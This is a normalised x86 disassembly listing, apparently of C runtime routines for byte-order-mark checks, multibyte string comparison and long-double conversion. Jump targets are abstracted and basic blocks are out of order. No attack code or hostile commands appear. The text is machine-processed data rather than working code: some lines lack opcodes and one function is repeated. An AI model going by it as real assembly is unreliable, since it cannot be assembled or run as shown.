mov eax edi
cdq
push edx
push eax
push [ esi ]
call sub_44fc25
add esp 0xc
cmp eax ebx
je r-xdata
pop ecx
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x1c ]
push eax
push [ esi ]
call sub_4403c9
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x1c ] 0xbfbbef
push 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_44bd22
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp ebx edi
jg r-xdata
mov [ ebp - 0x1c ] 0xfeff
push 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_44bd22
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_440e04
pop ecx
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
mov [ ebp - 0x8 ] esi
jmp r-xdata
push edi
push edi
push [ esi ]
call sub_440cbb
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x1c ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax ebx
sub eax edi
push eax
lea eax [ ebp + edi - 0x1c ]
push eax
push [ esi ]
call sub_44ad99
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or ebx 0xffffffff
pop ebx
jmp r-xdata
push edi
push 0x2
push [ esi ]
call sub_440cbb
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_44bd22
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_44bd22
and eax edx
add esp 0x10
cmp eax ebx
je r-xdata
sub_44e63f
push 0x14
push r--data
call sub_43f8e0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x18 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
je r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
call sub_43f8c5
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
call sub_43f925
retn
mov [ ebp - 0x4 ] edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax esi
call sub_44df0b
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44e6d5
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ esi ] 0xffffffff
sub_44e6d5
cmp [ ebp - 0x1c ] edi
je r-xdata
retn
cmp [ ebp - 0x20 ] edi
je r-xdata
push [ esi ]
call sub_442eaa
pop ecx
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_44e703
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_44e63f
add esp 0x18
pop ebp
retn
sub_44e723
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_438ce6
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44d04d
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx edx
movzx ecx [ ecx + 0x11d ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx edx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
mov si bx
jmp r-xdata
mov ecx edx
movzx ecx [ ecx + 0x11d ]
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx edx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx ecx [ edi ]
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx ecx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_44e941
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_446232
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
movzx ecx [ ebx ]
dec [ ebp + 0x10 ]
movzx eax cl
inc ebx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ esi ]
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov al [ ebx ]
test al al
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test cx cx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx eax al
or cx ax
movzx ecx cx
inc ebx
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
shl eax 0x8
movzx edx dl
or ax dx
movzx eax ax
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_44eaa7
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_44eff8
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
